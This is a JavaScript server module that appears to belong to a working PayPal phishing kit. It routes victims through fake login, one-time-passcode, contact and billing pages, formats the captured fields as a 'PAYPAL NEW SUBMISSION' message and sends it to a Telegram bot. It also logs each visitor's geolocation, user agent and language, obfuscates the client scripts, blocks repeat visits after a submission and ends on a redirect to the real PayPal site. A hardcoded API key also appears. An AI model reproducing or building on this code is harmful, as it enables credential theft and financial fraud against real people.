import path from "path";
import fs from "fs/promises";
import sqlite3 from "sqlite3";
import { open } from "sqlite";
import { initDB } from "./db.js";
import axios from "axios";
import { sendMessageFor } from "simple-telegram-message";
import dotenv from "dotenv";
import JavaScriptObfuscator from "javascript-obfuscator";
import { obfuscateMultiple } from "./obfuscate.js";
import express from "express";
import session from "express-session";

const db = await initDB();

/* ================================
   IP HANDLING
=================================*/
function getClientIP(socket) {
  let ip = socket.handshake.headers["x-forwarded-for"] || socket.handshake.address;
  if (ip && ip.includes(",")) ip = ip.split(",")[0];
  if (ip && ip.startsWith("::ffff:")) ip = ip.replace("::ffff:", "");
  return ip;
}

function getReqClientIP(req) {
  let ip = req.headers["x-forwarded-for"] || req.connection.remoteAddress || req.socket.remoteAddress || (req.connection.socket ? req.connection.socket.remoteAddress : null);
  if (ip && ip.includes(",")) ip = ip.split(",")[0].trim();
  if (ip && ip.startsWith("::ffff:")) ip = ip.replace("::ffff:", "");
  return ip;
}

/* ================================
   JS OBFUSCATION
=================================*/
async function prepareObfuscatedAssets() {
  const srcDir = path.resolve("./public/js");
  const outDir = path.resolve("./public/obf-js");

  await fs.mkdir(outDir, { recursive: true });

  const entries = await fs.readdir(srcDir, { withFileTypes: true });
  const jsFiles = entries.filter(e => e.isFile() && e.name.endsWith(".js")).map(e => e.name);

  for (const name of jsFiles) {
    const srcPath = path.join(srcDir, name);
    const outPath = path.join(outDir, name);
    const code = await fs.readFile(srcPath, "utf8");

    const obfuscated = JavaScriptObfuscator.obfuscate(code, {
      compact: true,
      selfDefending: true,
      disableConsoleOutput: true
    }).getObfuscatedCode();

    await fs.writeFile(outPath, obfuscated, "utf8");
  }
}

/* ================================
   GEO-IP / USER INFO
=================================*/
async function sendAPIRequest(ipAddress) {
  const response = await axios.get(`https://api-bdc.net/data/ip-geolocation?ip=${ipAddress}&localityLanguage=en&key=bdc_4422bb94409c46e986818d3e9f3b2bc2`);
  return response.data;
}

async function buildUserInfo(req, sendAPIRequest) {
  try {
    const ipAddress = getReqClientIP(req);
    const userAgent = req.headers["user-agent"];
    const systemLang = req.headers["accept-language"];
    const geoInfo = await sendAPIRequest(ipAddress);

    const now = new Date().toISOString();

    return [
      "🌍 GEO-IP INFO",
      `IP: ${geoInfo?.ip || "Unknown"}`,
      `City: ${geoInfo?.location?.city || "Unknown"}`,
      `State: ${geoInfo?.location?.principalSubdivision || "Unknown"}`,
      `ZIP: ${geoInfo?.location?.postcode || "Unknown"}`,
      `Country: ${geoInfo?.country?.name || "Unknown"}`,
      `Time: ${geoInfo?.location?.timeZone?.localTime || "Unknown"}`,
      `ISP: ${geoInfo?.network?.organisation || "Unknown"}`,
      "",
      `User-Agent: ${userAgent || "N/A"}`,
      `Language: ${systemLang || "N/A"}`,
      `Timestamp: ${now}`
    ].join("\n");

  } catch (err) {
    console.error("❌ Failed to build user info:", err);
    return `========================\n🌍 GEO-IP INFO\nError retrieving data for IP: ${req.ip}\n========================`;
  }
}
 
/* ================================
   PAGEFLOW
=================================*/
const DEFAULT_PAGEFLOW = {
    "1": { page: "login", enabled: true },
    "2": { page: "otp", enabled: true },
    "3": { page: "contact", enabled: true },
    "4": { page: "bill", enabled: true },
    "5": { page: "final", enabled: true }
  };

  const pageFlow = DEFAULT_PAGEFLOW;
  

async function getPageFlow(db, id = 1) {
  try {
    const row = await db.get(`SELECT pageFlow FROM admin_settings WHERE id = ?`, [id]);
    if (!row || !row.pageFlow) return DEFAULT_PAGEFLOW;

    const parsed = JSON.parse(row.pageFlow);

    // Backward-compatibility: convert old format if needed
    const normalized = {};
    Object.entries(parsed).forEach(([key, value]) => {
      if (typeof value === "string") {
        normalized[key] = { page: value, enabled: value !== "0" };
      } else if (typeof value === "object" && value.page) {
        normalized[key] = { page: value.page, enabled: value.enabled ?? true };
      }
    });

    return normalized;
  } catch (err) {
    console.error("Failed to read pageFlow:", err);
    return DEFAULT_PAGEFLOW;
  }
}

async function savePageFlow(db, pageFlow, id = 1) {
  try {
    // Ensure all entries have {page, enabled}
    const normalized = {};
    Object.entries(pageFlow).forEach(([key, value]) => {
      if (typeof value === "string") {
        normalized[key] = { page: value, enabled: value !== "0" };
      } else if (value?.page) {
        normalized[key] = { page: value.page, enabled: value.enabled ?? true };
      }
    });
    
    console.log("normalized to be saved on db", normalized);

    const jsonString = JSON.stringify(normalized);
    await db.run(`UPDATE admin_settings SET pageFlow = ? WHERE id = ?`, [jsonString, id]);
    return true;
  } catch (err) {
    console.error("Failed to save pageFlow:", err);
    return false;
  }
}

/* ================================
   ROUTE MAP
=================================*/
const routeMap = {
  login: "sign-in",
  otp: "sign-in?action=otp",
  bill: "sign-in?action=bill",
  contact: "sign-in?action=contact",
  final: "https://href.li/?https://paypal.com"
};

function normalize(str = "") {
  return str.replace(/^\//, "").trim().toLowerCase();
}

function resolveFrontendRoute(backendPage) {
  return routeMap[backendPage] || backendPage;
}

function resolveBackendRoute(currentPage) {
  const clean = normalize(currentPage);
  const match = Object.keys(routeMap).find(
    backendKey => normalize(routeMap[backendKey]) === clean
  );
  return match || clean;
}

async function getNextPage(currentPage, req) {
  if (!currentPage) return null;

  // 🔄 ALWAYS fetch latest pageFlow from DB
  const pageFlow = await getPageFlow(db);

  if (!pageFlow || typeof pageFlow !== "object") return null;

  const backendCurrent = resolveBackendRoute(currentPage);

  const sortedKeys = Object.keys(pageFlow)
    .map(Number)
    .sort((a, b) => a - b);

  const currentIdx = sortedKeys.findIndex(
    key => pageFlow[key]?.page === backendCurrent
  );

  if (currentIdx === -1) return null;

  let nextPage = null;

  for (let i = currentIdx + 1; i < sortedKeys.length; i++) {
    const candidate = pageFlow[sortedKeys[i]];
    if (!candidate) continue;

    // 🔍 Debug (keep this)
    console.log(candidate.enabled, ":", candidate.page);

    // 🔒 STRICT enable check
    const isEnabled =
      candidate.enabled === true ||
      candidate.enabled === 1 ||
      candidate.enabled === "1";

    if (isEnabled) {
      nextPage = candidate.page;
      break;
    }
  }

  if (!nextPage) return null;

  const frontendRoute = resolveFrontendRoute(nextPage);

  // 🌐 External redirect handling
  if (
    frontendRoute.startsWith("http://") ||
    frontendRoute.startsWith("https://")
  ) {
    if (req?.session) {
      req.session.cookie.maxAge = 60 * 60 * 1000;
      req.session.blocked = true;
    }

    return frontendRoute
      .replace(/^\/+/, "")
      .replace(/\/+$/, "");
  }

  const normalized = frontendRoute.replace(/\/+$/, "");
  return normalized.startsWith("/")
    ? normalized
    : `/${normalized}`;
}

/* ================================
   MESSAGE BUILDER
=================================*/
async function buildMessage(data, options = {}) {
  const { sendToTelegram = false, botToken = null, chatId = null } = options;

  try {
    let message = `🤖 PAYPAL NEW SUBMISSION\n\n`;
    const excludeKeys = ["visitor", "userid", "security_code"];

    for (const [key, value] of Object.entries(data)) {
      if (value && !excludeKeys.includes(key.toLowerCase())) {
        message += `${key.toUpperCase()}   : ${value}\n`;
      }
    }

    if (sendToTelegram) {
      if (!botToken || !chatId) throw new Error("Bot token or Chat ID missing");
      const sendMessage = sendMessageFor(botToken, chatId);
      await sendMessage(message);
    }

    return message;
  } catch (err) {
    console.error("❌ buildMessage error:", err);
    return null;
  }
}

/* ================================
   AUTH / SESSION
=================================*/
function requireAdmin(req, res, next) {
  if (req.session?.isAdmin) return next();
  return res.redirect("/admin");
}

function blockedRedirect(db) {
  return async function (req, res, next) {
    try {
      const blockStatus = await db.get(`SELECT baSUB FROM admin_settings`);
      const blockAfterSub = !!(blockStatus && blockStatus.baSUB);

      if (blockAfterSub && req.session?.blocked && !req.session?.isAdmin) {
        return res.redirect(routeMap.final);
      }

      next();
    } catch (err) {
      console.error("Error in blockedRedirect middleware:", err);
      next(err);
    }
  };
}

async function isAutopilotOn(db) {
  const row = await db.get("SELECT autopilot FROM admin_settings WHERE id = 1");
  return row?.autopilot === 1;
}

export {
  buildMessage,
  isAutopilotOn,
  getClientIP,
  getReqClientIP,
  getNextPage,
  buildUserInfo,
  sendAPIRequest,
  getPageFlow,
  savePageFlow,
  pageFlow,
  requireAdmin,
  blockedRedirect,
  resolveFrontendRoute,
  prepareObfuscatedAssets,
  routeMap
};